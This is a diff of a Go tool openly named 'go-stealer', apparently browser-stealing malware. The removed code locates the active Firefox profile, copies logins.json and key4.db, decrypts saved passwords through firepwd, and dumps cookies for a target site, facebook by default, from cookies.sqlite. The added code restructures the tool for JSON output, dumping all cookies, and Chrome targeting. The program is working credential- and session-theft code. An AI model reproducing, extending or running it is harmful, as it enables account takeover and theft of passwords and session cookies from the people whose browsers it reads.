@@ -1,97 +1,34 @@
 package main
 
 import (
-	"database/sql"
 	"fmt"
-	_ "github.com/mattn/go-sqlite3"
 	"os"
 	"os/exec"
-	"log"
-	"io"
 	"flag"
 	"strings"
 )
-func cmdOut(command string) (string, error) {
+func CmdOut(command string) (string, error) {
 	cmd := exec.Command("cmd", "/C", command)
 	output, err := cmd.CombinedOutput()
 	out := string(output)
 	return out, err
 }
 type Credential struct{
-	host string
-	username string
-	password string
+	Host	 string `json:"host"`
+	Username string `json:"username"`
+	Password string `json:"password"`
 }
 type Cookie struct {
-	id int
-	name string
-	value string
-	host string
+	Name	string `json:"name"`
+	Value	string `json:"value"`
+	Host	string `json:"host"`
 }
-func crackCredentials(profilePath string) []Credential{
-	var credentials []Credential
-	os.MkdirAll("profile", 0755)
-	srcFiles := []string{profilePath + "\\logins.json", profilePath + "\\key4.db"}
-    dstFiles := []string{"./profile/logins.json", "./profile/key4.db"}
-	for i, srcFile := range srcFiles{
-		dstFile := dstFiles[i]
-		src, err := os.Open(srcFile)
-		if err != nil {
-			log.Fatal(err)
-		}
-		defer src.Close()
-		
-		dst, err := os.Create(dstFile)
-		if err != nil {
-			log.Fatal(err)
-		}
-		defer dst.Close()
-		
-		_, err = io.Copy(dst, src)
-		if err != nil {
-			log.Fatal(err)
-		}
-	}
-	x, _ := cmdOut("py firepwd/firepwd.py -d profile/")
-	y := strings.Split(x, "decrypting login/password pairs")
-	creds := strings.Split(y[1], "\n")
-	for _, cred := range creds{
-		if len(strings.TrimSpace(cred)) == 0{
-			continue
-		}
-		x := strings.Split(cred, ":b")
-		host := strings.TrimSpace(x[0])
-		y := strings.Split(x[1], ",b")
-		username := strings.Replace(y[0], "'", "", -1)
-		password := strings.Replace(y[1], "'", "", -1)
-		credentials = append(credentials, Credential{host, username, password})
-	}
-	return credentials
-}
-func getActiveProfilePath() string{
-	path := os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"
-	f, err := os.Open(path)
-	if err != nil{
-		log.Fatal(err)
-	}
-	dirs, err2 := f.Readdirnames(0)
-	if err2 != nil{
-		log.Fatal(err2)
-	}
-	activeDir := ""
-	for _, dir := range(dirs){
-		if _, err := os.Stat(path + "\\" + dir + "\\cookies.sqlite"); err == nil {
-			activeDir = dir
-		} 
-	}
-	path = path + "\\" + activeDir
-	return path
+type Data struct{
+	Cookies 	[]Cookie 		`json:"cookies"`
+	Credentials []Credential 	`json:"credentials"`
 }
 
 func main(){
-	var cookies []Cookie
-	profilePath := getActiveProfilePath()
-	cookiesPath := profilePath + "\\cookies.sqlite"
 	fs := flag.NewFlagSet("Go-stealer", flag.ExitOnError)
 	fs.Usage = func() {
 		fmt.Fprintf(os.Stderr, "Usage: go-stealer.exe [OPTIONS]\n")
@@ -99,14 +36,29 @@ func main(){
 	}
 
 	var help bool
-	var host string
+	var dumpAll bool
 	var check bool
+	var output string
+	var host string
+	var browser string
 	fs.BoolVar(&help, "h", false, "display this help message")
 
 	fs.StringVar(&host, "web", "facebook", "Specific web url to look for in cookies")
 	fs.StringVar(&host, "w", "facebook", "Shorthand for web option")
+
+	fs.StringVar(&browser, "browser", "firefox", "Specific targeted browser")
+	fs.StringVar(&browser, "b", "firefox", "Shorthand for browser option")
+
+	fs.StringVar(&output, "output", "", "Log all result into a single JSON file")
+	fs.StringVar(&output, "o", "", "Shorthand for -output")
+
+	fs.BoolVar(&dumpAll, "dump-all", false, "Dump All cookies into single JSON file, --Output option is required for this.")
+	fs.BoolVar(&dumpAll, "a", false, "Shorthand for -dump-all")
+
 	fs.BoolVar(&check, "check-credentials", false, "Check local credential files and try to decrypt it.")
 	fs.BoolVar(&check, "c", false, "Shorthand for check-credential option")
+
+
 	err := fs.Parse(os.Args[1:])
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "%v\n", err)
@@ -117,40 +69,9 @@ func main(){
 		fs.Usage()
 		os.Exit(0)
 	}
-	fmt.Println("Opening SQL File")
-	db, err := sql.Open("sqlite3", cookiesPath)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer db.Close()
-	rows, err := db.Query("select id, name, value, host from moz_cookies where host like '%" + host + "%'")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer rows.Close()
-	for rows.Next() {
-		var id int
-		var name string
-		var value string
-		var host string
-		err = rows.Scan(&id, &name, &value, &host)
-		if err != nil {
-			log.Fatal(err)
-		}
-		cookie := Cookie{id, name, value, host}
-		cookies = append(cookies, cookie)
-	}
-	err = rows.Err()
-	if err != nil {
-		log.Fatal(err)
-	}
-	for _, cookie := range(cookies){
-		fmt.Println(cookie)
-	}
-	if check{
-		creds := crackCredentials(profilePath)
-		for _, cred := range creds{
-			fmt.Printf("Site: %s \nUsername: %s\nPassword: %s\n\n", cred.host, cred.username, cred.password)
-		}
+	if strings.ToLower(browser) == "firefox"{
+		FirefoxStealer(host, output, dumpAll, check)
+	}else{
+		ChromeStealer(host, output, dumpAll, check)
 	}
 }
